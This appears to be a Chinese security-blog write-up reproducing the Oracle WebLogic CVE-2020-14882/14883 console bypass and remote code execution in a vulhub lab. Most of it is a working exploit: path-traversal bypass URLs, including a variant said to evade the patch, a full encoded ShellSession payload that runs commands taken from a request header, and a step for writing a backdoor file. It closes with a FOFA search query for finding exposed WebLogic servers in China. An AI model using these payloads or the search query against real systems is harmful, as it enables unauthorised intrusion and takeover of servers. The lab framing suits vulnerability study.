## 0x00 WebLogic介绍

它是美国Oracle公司出品的一个application
server，可以理解成是一个基于JAVAEE架构的中间件，一种具有EJB支持的完全加载web容器，像我们常见的一些其他中间件还有apache，tomcat，iis等。

Oracle WebLogic Server 是一个统一的可扩展平台，专用于开发、部署和运行 Java
应用等适用于本地环境和云环境的企业应用。它提供了一种强健、成熟和可扩展的 Java Enterprise Edition (EE) 和 Jakarta EE
实施方式。

## 0x01 漏洞描述

未经身份验证的远程攻击者可能通过构造特殊的 HTTP GET请求，利用该漏洞在受影响的 WebLogic Server
上执行任意代码。它们均存在于WebLogic的Console控制台组件中。

此组件为WebLogic全版本默认自带组件，且该漏洞通过HTTP协议进行利用。将CVE-2020-14882和CVE-2020-14883进行组合利用后，远程且未经授权的攻击者可以直接在服务端执行任意代码，获取系统权限。

## 0x02 漏洞影响

Oracle WebLogic Server，版本10.3.6.0，12.1.3.0，12.2.1.3，12.2.1.4，14.1.1.0

## 0x03 漏洞复现：

###  **一、环境配置**

1\. 本次漏洞复现采用vulhub的环境，weblocig的版本为12.2.1.3.0,该版本存在漏洞

https://github.com/vulhub/vulhub/tree/173136b310693d50cac183c6218e64c861e2aaf5/weblogic/CVE-2020-14882

2\. 复现漏洞环境配置

git clone https://github.com/vulhub/vulhub.git

3\. 进入靶场目录，cd /

![图片.png](https://image.3001.net/images/20211008/1633682932_616005f4f2a9de201f121.png!small)

4\. 部署其他环境

    
    
    curl -s https://bootstrap.pypa.io/get-pip.py | python3
    service docker start
    pip install docker-compose
    docker-compose up -d

5\. 访问http://192.168.55.129:7001/console,即可部署weblogic环境

###  **二、绕过后台登录**

1.权限漏洞绕过，主要的POC如下：

/console/images/%252E%252E%252Fconsole.portal

/console/css/%25%32%65%25%32%65%25%32%66console.portal

大写换成小写可绕过补丁：

/console/css/%252e%252e%252fconsole.portal

###  **三、利用poc进入shell环境**

1，进入登录后台 /console

2，尝试登录，并进行抓包

利用Burp的重放模块进行验证

poc：运用post提交方式

    
    
    /console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]{%22cmd.exe%22,%20%22/c%22,%20cmd}%20:%20new%20String[]{%22/bin/sh%22,%20%22-c%22,%20cmd};if(cmd%20!=%20null%20){%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();}%20currentThread.interrupt();
    

3，创建cmd运行框 或者写入后门文件：`①cmd:whoami && pwd ②echo 'this is a test!' >
/u01/oracle/wlserver/server/lib/consoleapp/webapp/images/test.jsp`

4，进行命令执行  
![图片.png](https://image.3001.net/images/20210924/1632476121_614d9bd9e0ab1f5d5ff52.png!small)

 **查找weblogic的话**  
`fofa语句：port="7001" && app="Weblogic_interface_7001"&& country="CN"`

> 让我们于星海中探寻源星~~~

